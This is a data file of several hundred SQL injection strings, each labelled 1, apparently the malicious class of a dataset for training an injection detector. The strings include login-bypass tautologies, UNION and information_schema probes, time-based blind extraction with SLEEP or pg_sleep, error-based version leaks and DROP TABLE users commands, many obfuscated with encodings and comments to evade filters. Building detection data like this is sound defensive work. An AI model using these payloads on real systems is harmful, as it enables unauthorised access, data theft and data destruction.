"1'			UNioN			SelecT			TaBlE_NAme,			nULl,			nULl			FroM			INFoRmATiOn_sCHema.TABLEs			----2uwk9s3985xilk5", 1
"%27/*!12345*/OR%201%3D1%20--%20", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20%20AND%20%27a%27%3D%27a%27--%23neuszm2", 1
"1%27 XOR s%75bstr%69ng(%64atabase(%29, 1, 1) = 's%27  --%20random_noise--#s2%36fdt3rfl8sc", 1
"1' OR AscIi(sUbsTring(dAtabaSe(), 1, 1)) > 100  and 'a'='a'--", 1
"'/**/and 1=cONvErt(iNt,@@VErSioN)----7vh2823pt", 1
"ADMiN'			or			'1'=%09'1%0a", 1
"1AND%250a1%3C%3D1", 1
"admin'/**/O/**/R/**/%271'	=%%320'1", 1
"' AND 1=convert(int,@@version) OR (1)--", 1
"1))/**/UNION/**/SELECT/**/1,database(),3#/*%0d%0a*/more_noise--", 1
"", 1
"t%65st'/*!*/OR%20'1'IN (1)'1' /*", 1
"WAITFOR %44ELAY '0:%30:5'%2d-", 1
";%U0020sElect%U0020pg_sLEEP(5);%u0020%U0020OR%u0020(1)--", 1
"'/*!12345*/OR 1>=1 --", 1
"1'/**/Or/**/if(SUBStriNG(DatABASE(),/**/1,/**/1)='a',/**/SLEEp(5),/**/0)/**/--", 1
"1&&", 1
"1=1/*%0d%0a*/", 1
"%27%20XOR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"' uNION SELecT nulL, nUll, Null --", 1
"'/**/XOR/**/EXISTS(SELECT/**/1/**/FROM/**/users) OR 'b'='b'--", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020--%25u0020", 1
"'%20UNio%4e sElEct NuLl%2c NUll, %6EuLl -- #17ZGqHejXSOlTdS", 1
"test%27%20%20%20%20OR%20%20%20%20%271%27%20LIKE%09%271%27%20%20%20%20/*#kjmlco4l4", 1
"1%27%20O/**/%52%20IF%%328su%62string%2%38database%28%29%2C%%3201%%32C%%320%31%2%39%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"1' %41ND%20substring(database(), 1, 1%29 %3d %27s' --", 1
"%27%20OR%20EXISTS%28SEL/*!12345*/ECT%201%20FROM%20users%29--", 1
"admin%27Or%0a%271%27%3D%271%0d%0a", 1
"1'  OR  IF(substring(database(),  1,  1)  =%09'a',  SLEEP(5),  0)  ----2knigymg3uebk", 1
"WAITFO%52%20D%45LA%59%20%270:0:5%27--", 1
"%27%20OR%20EXISTS%28SELECT%201%%320%46ROM%20u%73e%72s%29-%2d", 1
"1))				UNION				SELECT				1,database(),3				OR				(1)--", 1
";%U0020dRoP%U0020tAbLe%u0020uSErS;%u0020--", 1
"%27%20%20OR%20%20%271%27%20%3D%09%27%31", 1
"%27%20OR%20EXISTS(%53EL%45CT%201%20FR%4fM%20us%65rs)--#uphno1", 1
"%27%20or%20%271%27%3d%271--4e8r7", 1
"%27%20Or%201%3d1%20--%20", 1
"' %4fR 1<=1 -%2d #76r1oygqx", 1
"1%29%29%2555NION%250d%250aSELE%2543T%2531%2Cdata%2562ase%28%29%2C3--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'--#cl47aobdmxu", 1
"' UNION SELECT 1,2,3--#ewxpwywi", 1
"adMIn%27%2F%2A%2A%2FOr%2F%2A%2A%2F%271%27%3D%271", 1
"%u0027				OR				1%u0020%3D%u0020%u00201				--", 1
"admin%27					OR					%271%27%20%3D%09%271", 1
"'/%2a!12345*/AND/**/1=conv%65rt(int,@@vers%69o%6e%29--", 1
"1%29%29%2F%2A%2112345%2A%2FUNIoN%20SeLeCt%201%2CDATabaSe%28%29%2C3%20%23%20more_noise--", 1
"1%27%20O/*!*/R%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20%20OR%20%281%29--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20--2vh6xoiki", 1
";%20%20%20%20SELECT%20%20%20%20pg_sleep(5);%20%20%20%20----o6ums1xhdx7", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29----ny3h52cicv5vs", 1
"1)%u0020unION%U0020selECT%U00201,DaTaBASe(),3--", 1
"'%20OR EXISTS(SELECT 1 FROM users)--%23%71l%31h%38", 1
"%u0027%09%09%09%09AND%09%09%09%091	=%09convert(int,@@version)%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"1%27%20O/**/R%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"waItFOrDElay/*%0a*/'0:0:5'--", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
"'/**/OR/**/'1'='1 AND 'a'='a'", 1
"1%27%20O/*!*/R%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20 AND 'a'>='a'--", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2F1%2509%3D%2509convert%28int%2C%40%40version%29%2F%2A%2A%2F--%2F%2A%2A%2Frandom_noise--", 1
";DROP/*%0d%0a*/TABLE", 1
"users;--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20#%20more_noise--", 1
"'/**/|| (1=1)EXISTS(SELECT 1 FROM users)--", 1
"%27%2F%2A%2A%2FoR%20%271%27%3D%271", 1
";/*!12345*/SEleCT pg_sLeep(5); --", 1
"WAI%2554FOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%25270%3A0%3A5%27%252d-", 1
"a%64min' OR '1'='%31", 1
"%27%2F%2A%2112345%2A%2FAND%201%3D1%20--%20", 1
"' AND extractvalue(1,%63o%6ecat(0x5c%2cv%65rsio%6e())) /*!*/AND 1=1--", 1
"1))%20UniOn%20SeleCt%201,DatAbAse(),3--", 1
"1) UNION SELECT 1,database(),3--#abm6li8", 1
"%u0027%u0020OR%u0020eXIStS(s%45lECT%u0020%31%20%46roM%u0020userS)--", 1
"; %53%45LECT pg_s%6ceep(5); --", 1
"1%2527%2520OR%2520IF%28s%2575b%2573tring%28data%2562ase%2528%29%2C%2520%2531%2C%25201%29%253D%2527a%2527%2C%2520SLEEP%285%29%2C%25200%29%2520--", 1
"'OR1=1/*%0a*//**/AND 'a'='a'--", 1
"; SELECT pg_sleep(5);  OR (1)--", 1
"1'%20aND S%75bsTRIn%67(dat%61baS%65(), 1, 1) = 'S' --", 1
"t%65%73t' OR '1'='1'%20--", 1
"test%27%20OR%20%271%27%3E%3D%271%27%20%2F%2A", 1
"'%20%20AND%20%201	=%09convert(int,@@version)--", 1
"%27%20XOR%20%271%27LIKE%271", 1
"1%29%29UNION", 1
"SELECT1,databa%73e(),3--/*%%30d%0a*/", 1
"'%20AND 1=convert(in%74,@@vers%69on%29----8i5b0ycocm", 1
"%27%20anD%20ExTrActvAlUe%281%2cCONCat%280x5c%2cVerSioN%28%29%29%29--", 1
"1))UNION/*%0a*/SELECT1,database(),3OR(1)--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20#2ilywh448q7", 1
"' uNIoN sEleCT 1,2,3--", 1
"%27%2F%2A%21%2A%2FU%254eION%20%2553ELEC%2554%20%256eull%2C%20null%2C%20null%20--%20", 1
"%27%20OR%20%27%2531%27%3D%271%20%254f%2552%20%27b%27%3D%27b%27", 1
"' UNION SELECT 1,2,3----nxdscq4oazjj", 1
"1' UNI%4fN SE%4cECT %74able%5fnam%65%2c null, null F%52OM in%66ormation_schema.tables --", 1
"admin%27%20%7C%7C%20%271%27%3D%271", 1
"adMin%27%20or%20%271%27%3d%271", 1
";/*!*/SElEcTPG_slEeP(5);----88nQ2Itn%0a", 1
"%3B%25U0020SeLEct%25u0020Pg_SLEep%285%29%3B%25U0020--", 1
"1))UNIONSELECT1,database(),3--/*%0a*/", 1
"1))/*!12345*/UNION SELECT 1,database(),3--#lfnmf2", 1
"1))%20Un/*!*/Ion%20sEleCT%201,DatabASE(),3--", 1
";  SELECT  pg_sleep(5);  --", 1
"'/**/UNION%2f**/SELECT/**/nu%6cl,/**/nu%6cl,/**%2fnull/*%2a/--/*%2a/", 1
"' && (1IN (1)1)1=1 --", 1
"%u0027%u0020And%u0020ExtRacTvAlUE(1,coNcAT(0X5C,VerSioN()))--#4C4rT7QGYSXJS6R", 1
"%27%20AnD%201%3DCoNVERt(int,@@vErsion)--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'--#anw4s72h7o", 1
"%u0027%u0020OR%u0020%u00271%u0027/**/=/**/%u00271", 1
"' AND%201=conver%74(int,@@v%65%72sion)--", 1
"1'/**/UNION%2f**/%53ELECT%2f**/tabl%65_name,/**/null%2c/**/n%75ll/**/FROM/**/%69nformation_s%63hema%2et%61bles/%2a*/ -- random_n%6fise----yw75yus%30t", 1
"1%u0027/*!*/||%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"1'UNIONSELECT", 1
"table_name,null,nullFROMinformation_schema.tables--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  /*!*/AND 1=1--", 1
"1))/**/Un%49On SElect 1,D%61taBa%73%65(),3--", 1
"1%27/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**//**//*!*/AND/**/1%3D1--", 1
"tESt%27%20oR%20%271%27%3D%271%27%20 -- random_noise--%20", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/* /*!*/AND 1=1", 1
"TESt%27%20or%20%271%27%3d%271%27%20--%20#D2WXw9i23Z8", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----kvr3cjh", 1
"1%27ORasci%69(substrin%67(data%62as%65(),/*%0d%0a*/1,%2f*%0d%0a*%2f1))%3E10%30%0a--", 1
";%u0020DroP%u0020tablE%u0020usERs;%u0020--", 1
"' AND 1=1  AND 'a'='a'--", 1
"WAITFOR%20DELAY%20%270%3A0%3A5%27 -- random_noise--", 1
"'OR/*%0d%0a*/'1'='1/*%0d%0a*/--jsfbkvy7tk4", 1
"1' AND%20substring(dat%61base%28),%201%2c 1) = 's' --", 1
"'/**/UNI%4fN/**/SE%4cECT/**/null,/**/nul%6c%2c/**/null/**/--/**/", 1
"1%27%20AND%20su%62string%2%38database%28%%329%2C%20%31%2C%2%301%29%20%3D%2%30%27s%%327%20--", 1
"1'/**/UNION     SELECT     table_name,     null,     null     FROM     information_schema.tables     --", 1
"' And 1=CoNvert(InT,@@VerSioN)--", 1
"%3B%20SELECT%20%2570g%255fsleep%25285%29%3B%20--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)----adbd2imxb5ijkk", 1
"1)) UNION SELECT 1,database(),3----1bb4xg7to", 1
"1' A%4ed SUBStRIng(dat%41BASe(), 1, 1) >= 's' ---%2d4d5u%683qc%6ckg%61", 1
"%27%2F%2A%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29--%23lsrf5za4", 1
"test%27%20OR%20%271%27%3D%271%27%20/* /*!*/AND 1=1", 1
"%25U0027%25u%2530020OR%25u%2530020%25U00271%25u0027%3d%25%25750027%2531", 1
"1'%09%09%09UNION%09%09%09SELECT%09%09%09table_name,%09%09%09null,%09%09%09null%09%09%09FROM%09%09%09information_schema.tables%09%09%09--", 1
"1%20%26%26%201%3D1#2pkj7", 1
"'AND", 1
"1IN(1)1/*%0a*/--%0a#rubrwnfyyt024", 1
"%u0027/*!*/OR%u0020%u00271%u0027=%u00271 AND 'a'='a'", 1
"1%U0%3027%U%3002%30A/**/n%44%U%30020%73uBstRiNg(DaTaBAse(),%%7500%3201,%u00201)%u0020=%U0020%%750027S%u0027%U0020--", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29----jalikz", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  OR 'b'='b'--", 1
"test%u0027O/**/R%u00271%u0027<=%u00271%u0027/*%0d%0a*//*", 1
"tEST%u0027/**/Or/**/%u00271%u0027=%u00271%u0027/**/--/**/", 1
"1%u%30027%u0020UNION%%750020SELECT%u%30020%74%61ble%5fnam%65,%u0020null,%u0020null%u002%30FROM%u0%3020information_%73chema.table%73%u0020--#043u4ay%31p", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--", 1
"%27%20UNION%20SELECT%201,2,3 OR (1)--", 1
";%20dRop%20TaBLe%20USErs;%20 -- RANdom_NOISE--", 1
"1%25u0027%25u0020AND%25u0020substring%28database%28%29%2C%25u00201%2C%25u00201%29%25u0020%2509%3D%2509%25u0020%25u0027s%25u0027%25u0020--", 1
"'     XOR     1  =	1          AND     'a'  =	'a'--", 1
"tes%74' OR%20'1'=%271' --", 1
"test'/*!12345*/ OR  '1'  =	'1'  /* OR 'b'='b'", 1
"%2527%20OR%20EXISTS%28SELECT%201%20F%2552OM%20use%2572s%2529--", 1
"%3b%20selEcT%20pg_SLeeP%285%29%3b%20--", 1
"%u0027aNdextRACtVAlUe(1,Concat(0X5C,Version()))--%0a", 1
"1A/*!12345*/ND%0d%0a1%09=%09%31", 1
"1%27%20O/*!*/R%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--", 1
"%27%20%26%26%20%281%3d1%29ExTRACtValUe%281%2CconCat%280X5c%2CvErsIon%28%29%29%29--", 1
"%u0027/*!12345*/AND%091	=%20convert(int,@@version)--", 1
"'/**/&&/**/(1>=1)1=1/**/--/**/", 1
"1%27/**/O/*!*/R/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**/--", 1
"%27%09%09%09UN/**/ION%09%09%09SELECT%09%09%09null%2C%09%09%09null%2C%09%09%09null%09%09%09--%09%09%09", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3----pebbe3intysj", 1
"1%u0%3027/*!1234%35*/OR%u%3002%30as%63i%69(substring(%64atabase(),%u00201,%u00201))%u%3002%30>%u0020100%u0020--", 1
";SELECT%0d%0apg_sleep%28%35)%3b--/*%0d%0a%2a/", 1
"test'     OR     '1'%09= '1'     --", 1
"admin' || (1=1)'1'='1", 1
"'/**/AND/**/1=1/**/ OR (1)--/**/", 1
"%3B%25u0020SELECT%25u0020pg_sleep%285%29%3B%25u0020--%23f7vukgt5f24nf", 1
"1%27%20&&%20(1%3E%3D1)substring(database(),%201,%201)%20%3D%20%27s%27%20--#7ac1qjvai1lov", 1
"admin'/*!12345*/OR'1'='1#ycao3lvxfoba/*%0d%0a*/", 1
"%3b%20DROP%20%54ABLE%20users;%20--", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271#zr0mtz", 1
"'/*!1%32%3345*%2f|| EXISTS(%53ELECT 1 %46ROM users)--", 1
"%27 A%4eD 1=1 --", 1
"%27%20||%20(1%3E%3D1)1%3D1%20--%20", 1
"%27UNION/*%0d%0a*/SELECTnull,null,nullOR(1)--", 1
"ADmIn'					oR					'1'%09=%20'1#C88oWgHf6O", 1
"test'OR%0d%0a'1'='1'--%0a", 1
"%27%20UnioN%20seLECT%20NuLL%2C%20Null%2C%20NULl%20--%20", 1
"%27%20and%201%3D1%20--%20--jSjK4p5MnfnefD", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020----aw97ktdcc", 1
"1%u0027/*!*/ORIF(substring(database(),", 1
"1,%0a1)=%u0027a%u0027,SLEEP(5),0)--#wyu3qtqt7vhgwfi", 1
"aDMIn%27%20Or%20%271%27%3d%271%20aNd%20%27a%27%3D%27a%27", 1
"' OR 1=1  OR (1)--", 1
";SELECT/*%0d%0a*/pg_sleep(5);/*%0d%0a*/--/*%0d%0a*/", 1
"1%u0027ORIF(substring(database(),1,1)=%u0027a%u0027,SLEEP(5),", 1
"0)--", 1
"%27%20UN/**/ION%20SEL%2545%2543T%25201%2C2%2C3--", 1
"' && (1=1)1=1 --", 1
";%20%20%20%20SElecT%20%20%20%20PG_sLeEp(5);%20%20%20%20--", 1
"%31 && (1=1)1=1", 1
"admin'OR", 1
"'1'='1/*%0d%0a*/ AND 'a'='a'", 1
"' UNion SE%4cECt nuLl, n%75ll, nULl  %23%20moRe_nOI%73e--", 1
"1'%20%20%20%20OR%20%20%20%20IF(substring(database(),%20%20%20%201,%20%20%20%201)  =	'a',%20%20%20%20SLEEP(5),%20%20%20%200)%20%20%20%20 XOR 'b'='b'--", 1
"1'ORascii(substring(database(),", 1
"1,1))>%0d%0a100--", 1
"%27%20O/*!12345*/R%201%3D1%20--%20#glorgw", 1
"1%27%20uNIoN%20SElecT%20TABLe_NAMe%2C%20nulL%2C%20nuLl%20fROM%20iNFormatION_sCHeMa.TABLeS%20%20AND%20%27a%27%3D%27a%27--", 1
"WAITFOR%u%30020DEL%41Y%u0%3020%u00270:0:5%u0027/%2a*/-%2d random_n%6fise--", 1
"1%20%26%26%20%281%3D1%291%3D1%234jz772z1f7aq", 1
"test%27/*!12345*/OR%20%271%27IN%20(1)%271%27%20/*", 1
"'/**/AND 1=convert(int,@@version) OR 'b'='b'--#nfm42", 1
"1' OR%20ascii(sub%73tring%28dat%61base(), 1, 1)) >%20100 --", 1
"'/**/XOR/**/1=1/**/--/**/", 1
"'/**/unioN seLecT 1,2,3----cigjr", 1
";SEL/*!12345*/ECT/*%0a*/pg_sleep(5);--%0d%0a", 1
"'/*!*/|| 1=1  or (1)--", 1
"%27%2509%2509%2509%2509AND%2509%%32%3509%%32509%250%39extra%63tva%6cue%281%2Cconcat%%3280x5c%2Cversion%28%29%%329%29-%2d", 1
";/*!*/SELECT pg_sleep(5);  /*!*/AND 1=1--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2f*", 1
"'/**/ANd/**/extRACTVAlue(1,CONCAT(0X5c,verSIOn()))/**/OR/**/'b'='b'--", 1
"' XoR 1<=%31 %2d-", 1
"1%27||/*%0a*/IF(substring(database(),1,1)%3E%3D%27a%27,/*%0d%0a*/SLEEP(5),0)--/*%0a*/", 1
"WAITFOR%2520%2520%2520DELAY%2520%2520%2520%270%3A0%3A5%27--", 1
"%27%20UNiOn%20SEleCt%201%2C2%2c3--", 1
"1%29%2F%2A%21%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"%3B%20SEL/*!12345*/ECT%20pg_sleep%285%29%3B%20 OR (1)--", 1
";/*!*/DrOP%u0020TAbLE%u0020UsERS;%u0020--", 1
"1)%20UNIO%4e%20SELECT%201,dat%61base()%2c%33--", 1
"'oRExiSTS(SELect/*%0a*/1FrOMuSERS)--/*%0d%0a*/", 1
"1'/**/         UNION          SELECT          table_name,          null,          null          FROM          information_schema.tables          --", 1
"test' || '1'>='1' --", 1
"' || '1'='1", 1
"'      AND      extractvalue(1,concat(0x5c,version())) # more_noise--", 1
"admin'OR%0d%0a'1'='1#ehzvb0dyuj/*%0d%0a*/", 1
";SELECT", 1
"pg_sleep(5);--", 1
"%2527%2520XOR%2520extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1' AnD substrIng(DaTABasE(), 1, 1) = 'S' --", 1
";SELECT/*%0d%0a*/pg_sleep(5);/*%0d%0a*/ AND 'a'='a'--", 1
"", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--%23udpl7fe", 1
"test'%20%20%20O%52%20%20%20%271'	=%20'1%27%20%20%2%30/*", 1
"' OR '1'='1#vy1buer1mh", 1
"' and EXtraCtVAlUE(1,CONcat(0X5C,VersiON())) AND 'a'='a'--", 1
";%U0020SeLECT%u0020Pg_sLeeP(5);%U0020--", 1
"1)) UNIOn SeLecT 1,DatAbase(),3--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20--5sm2mszg", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29----8jiqel", 1
"%27%20XOR%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"; SELECT p%67_s%6ceep(5); %2d-", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020  =	%u0020%u0027s%u0027%u0020--", 1
"TesT%25U0027%25U0020oR%25U0020%25U00271%25U0027%3D%25U00271%25U0027%25u0020--%25u0020", 1
"%27%20O/*!*/R%20%271%27%3D%271#j6bu8r7qqii", 1
"'  AND  1	<=	1  --", 1
"1%27%20%20%20%20%20%20%20%20%20%20OR%20%20%20%20%20%20%20%20%20%20IF%28substring%28database%28%29%2C%20%20%20%20%20%20%20%20%20%201%2C%20%20%20%20%20%20%20%20%20%201%29%2520%3D%09%27a%27%2C%20%20%20%20%20%20%20%20%20%20SLEEP%285%29%2C%20%20%20%20%20%20%20%20%20%200%29%20%20%20%20%20%20%20%20%20%20 -- random_noise--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#xie2bhxcpi42", 1
"1%25u0020aND%25u00201%3D1%20OR%20%281%29", 1
"test%u0027/*!12345*/OR%u0020%u00271%u0027LIKE%u00271%u0027%u0020/* AND 'a'='a'", 1
"1AND1=1--a9syqg47vgq2", 1
"", 1
"'uNIoNSelect%0d%0a1,2,3--", 1
"'/%2a*%2f%2f**//**//*%2a%2f/**//**/AND/*%2a//**//**//**//**//**/1	<=/**//**%2fc%6fnvert(int,@%40version)--", 1
"TEST'			oR			'1'	=	'1'			/*#y53h0e6", 1
"test'%20%20%20%20OR%20%20%20%20'1'%20=	'1'%20%20%20%20--%20%20%20%20", 1
"te%73t%%32%37%20OR%20%271%27%3%44%271%27%20--%20", 1
"1'ORascii(substring(database(),%0a1,1))>100%0aOR'b'='b'--", 1
"1%27%2F%2A%21%2A%2FOR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20%20%23%20more_noise--", 1
";%20droP%20tABLe%20useRs;%20--", 1
"'  %4f%72%20 1 =%201  --  #0umows7%51UJdvbZH", 1
"'and", 1
"1=COnvErT(InT,@@versIoN) OR 'b'='b'--%0d%0a", 1
"%u0027%u0020AND%u00201>=convert(int,@@version)--#3mx6wn44m1og", 1
"1' O%52 IF(substrin%67(database(), 1%2c 1)='a',%20SLE%45P%285), 0) --", 1
"1%27/**/OR/**/ascii(substring(databa%73e%28),/**/1,/**/1))%20%3e/**/100/**/--", 1
"tesT%27%20Or%20%271%27%3D%271%27%20%2F%2A%20%2F%2A%21%2A%2FAND%201%3D1", 1
"%27%20||%20(1%3D1)EXISTS(SELECT%201%20FROM%20users)--", 1
"'OR", 1
"'1'='1/*%0a*/ OR (1)", 1
"%27%20Un/**/Ion%20SelECT%20NULL%2c%20nuLl%2c%20NULl%20--%20", 1
"%u0027%u0020AND%u00201=convert(int,@@version) OR 'b'='b'----k45ixkh", 1
"%u0027		Or		1%09=/**/1		--", 1
"test%u0027%u0020OR%u0020%u00271%u0027<=%u00271%u0027%u0020--%u0020--c6u5t3sl9v9", 1
"1))%u0020UnIon%u0020SeleCT%u00201,DatAbase(),3--", 1
"' XOR '1'='1--07f8mpiws8j4", 1
"; SELECT pg_sleep(5);  AND 'a'='a'--", 1
"1%29%29%2F%2A%21%2A%2FUNIO%4e%%32%30SELECT%2%301%2C%64atab%61se%28%29%2C3--", 1
"'/**/||/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"%u0027UNIONSELECT%0anull,null,null--%0d%0a", 1
"test'		OR		'1'/*!12345*/=%20'1'		/*", 1
"WAITFOR		DELAY		'0:0:5'--", 1
"TESt' or '1'='1' --", 1
"%27%20aND%201%3D1%20--%20%23uEXzrVVg4", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F%20%23%20more_noise--", 1
"' || 1=1 -- --5pk0wgma5toz", 1
"' OR '1' =%20'1", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29----uftuv2i25", 1
"'/*!*/OR %271'='%31", 1
"'		UNION		SELECT		1,2,3/*!*/# more_noise--#e35jc0vm1", 1
"%27%20OR%201%3D1%20--%20--k2p87gngq", 1
"WA%49TFOR/*!*/DELAY%20'0%3a0:5'--", 1
"%27%20AND%201%3D1%20--%20--f4l727ev4ci6i6", 1
"' && (1=1)%31=1 -%2d", 1
"WAiTFOr%20%20%20%20%20DeLAY%20%20%20%20%20'0:0:5'----2G4UEQrk96", 1
"1%27%20oR%20IF%28sUbstRInG%28daTabASE%28%29%2C%201%2c%201%29%3D%27A%27%2C%20sLeEp%285%29%2C%200%29%20--", 1
"WAITFOR%20DELAY%20%270%%33A0%3A5%%327-%2d", 1
"1%27 %20  && %20  (1  %3d  1)s%75bstring(%64atabase(),    1,  %20 1)    %20 =   %20  's'    --#ea55ja4i", 1
"%27%%320OR%201%3D1%%320--%20", 1
"'/**/AND 1=convert(int,@@version)--", 1
"aDmin%27%20or%20%271%27%3D%271", 1
"'/**%2fAND/**/extractv%61lue%281,c%6fncat(0x5c,ver%73ion%28)))----p%76ujs6h6", 1
"%27 || (1=1)1=1 %2d-", 1
"' aNd exTrACtVAlUE(1,CoNcAT(0X5c,Version()))--", 1
"1)%09%09UniOn%09%09SELecT%09%091,DAtABaSe(),3 -- RandOm_noise--", 1
"%27%20and%201%3D1%20--%20", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29--%23dd46fyv6pt", 1
"a%64min'/*%2a/||/**%2f'1'='1", 1
"%27%20%2541nD%201%253d1%20--%20", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  OR (1)----1d5ugf82", 1
"1 AND 1=1#3jv5x3v", 1
"%3B%20dROp%20tAbLE%20uSErS%3B%20--", 1
"'  OR  EXISTS(SELECT  1  FROM  users)  /*!*/AND  1%09>=%091--", 1
"1%U0020anD%u00201=1#i82h0wgtem", 1
"admin'%09%09%09%09OR%09%09%09%09'1' >=  '1 # more_noise", 1
"1%u0027%20%20%20%20%20OR%20%20%20%20%20ascii(substring(database(),%20%20%20%20%201,%20%20%20%20%201))%20%20%20%20%20>%20%20%20%20%20100%20%20%20%20%20--", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020#dc6swwlq6uht0", 1
"WAIT%46OR%20DELAY%20%270%3A%30%3A5%27-%2d -- random_noise", 1
"%u0027%20AND%u00201=con%76ert(int%2c@@version%29--", 1
"'/**/AnD/**/eXtRactvA%6cUE%281,%63O%6eC%61t(0X5c,VersIon()))--", 1
"waITfor%u0020dELAy%u0020%u00270:0:5%u0027--", 1
"1%27%%320%26%2%36%20substr%69ng%28datab%61se%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--%23drld%6csck%32oe%74%6e17", 1
"1 A%4eD 1=1", 1
"admi%6e' || '1'='1%23zfla%69cih%72vguib", 1
"'/*!*/AND 1=convert(int,@@version)--", 1
"'/**/unIoNSeLect/*%0d%0a*/1,2,3--random_noise--", 1
"test%25U0027%25U0020Or%25U0020%25U00271%25u0027%3d%25u00271%25U0027%25U0020%2f%2a", 1
"admin%u0027OR/*%0a*/%u00271%u0027=%u00271%0a", 1
"%27UNIONSELECT", 1
"null,null,null%0a%20AND%20%27a%27%3D%27a%27--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*/*!*/--random_noise/*%0d%0a*/", 1
"test' OR '1'LIKE'1' --", 1
";%20DROp%20taBlE%20UsERS;%20%20#%20more_noise----koyq2", 1
"' aND 1<=1 --", 1
